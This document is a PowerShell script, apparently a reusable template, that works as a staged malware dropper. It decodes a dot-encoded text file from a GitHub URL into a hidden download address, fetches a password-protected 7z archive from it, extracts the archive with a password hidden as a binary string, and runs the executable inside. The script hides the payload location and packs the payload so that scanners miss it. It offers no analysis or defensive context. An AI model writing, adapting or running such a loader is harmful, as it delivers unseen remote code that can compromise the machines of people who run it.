# Function to convert encoded string (without commas) to binary
Function Convert-EncodedStringToBinary {
    Param ([string]$encodedString)
    $binaryString = $encodedString -replace '\.', '1' -replace '[^1]', '0'
    return $binaryString
}

# Function to convert binary string to hex
Function Convert-BinaryToHex {
    Param ([string]$binaryString)
    $binaryGroups = $binaryString -split '(?<=\G.{8})'
    $hexString = $binaryGroups | ForEach-Object { [convert]::ToString([convert]::ToInt32($_, 2), 16) }
    return ($hexString -join '')
}

# Function to convert hex to ASCII text
Function Convert-HexToASCII {
    Param ([string]$hexString)
$bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
    if ($i + 1 -lt $hexString.Length) {
        [Convert]::ToByte($hexString.Substring($i, 2), 16)
    }
}

    $asciiText = [System.Text.Encoding]::ASCII.GetString($bytes)
    return $asciiText
}


# Function to download file
Function Download-File {
    Param ([string]$url, [string]$path)
    Invoke-WebRequest -Uri $url -OutFile $path
}

# Function to download and extract 7-Zip command line version
Function DownloadAndExtract7Zip {
    $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
    $sevenZipDownloadPath = ".\7za.zip"
    $sevenZipExtractPath = ".\7zip"
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
    & Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
}

# Function to decrypt hardcoded binary string to get password
Function Get-DecryptedPassword {
    $hardcodedBinary = "0011000100110010001100110011010000110101" # Replace with your hardcoded binary
    $binaryGroups = $hardcodedBinary -split '(?<=\G.{8})'
    $password = ($binaryGroups | ForEach-Object { [convert]::ToChar([convert]::ToInt32($_, 2)) }) -join ''
    return $password
}

# Main script
$url = "https://raw.githubusercontent.com/notforuseactually/404/main/8.txt" # Replace this with the actual URL
$rawText = Invoke-RestMethod -Uri $url

# Decode and convert process
$binaryString = Convert-EncodedStringToBinary -encodedString $rawText
$hexString = Convert-BinaryToHex -binaryString $binaryString
$finalUrl = Convert-HexToASCII -hexString $hexString

# Download the target file
$downloadPath = ".\DownloadedFile.7z"
Download-File -url $finalUrl -path $downloadPath

# Download and extract 7-Zip
DownloadAndExtract7Zip

# Get password and unzip the downloaded file
$password = Get-DecryptedPassword
$sevenZipCmdPath = ".\7zip\7za.exe"
& $sevenZipCmdPath x $downloadPath -o".\ExtractedFile" -p$password

# Execute the extracted file
$extractedFilePath = ".\ExtractedFile\YourExecutable.exe" # Update this path as necessary
if (Test-Path -Path $extractedFilePath) {
    Invoke-Item $extractedFilePath
} else {
    Write-Error "The extracted file does not exist."
}
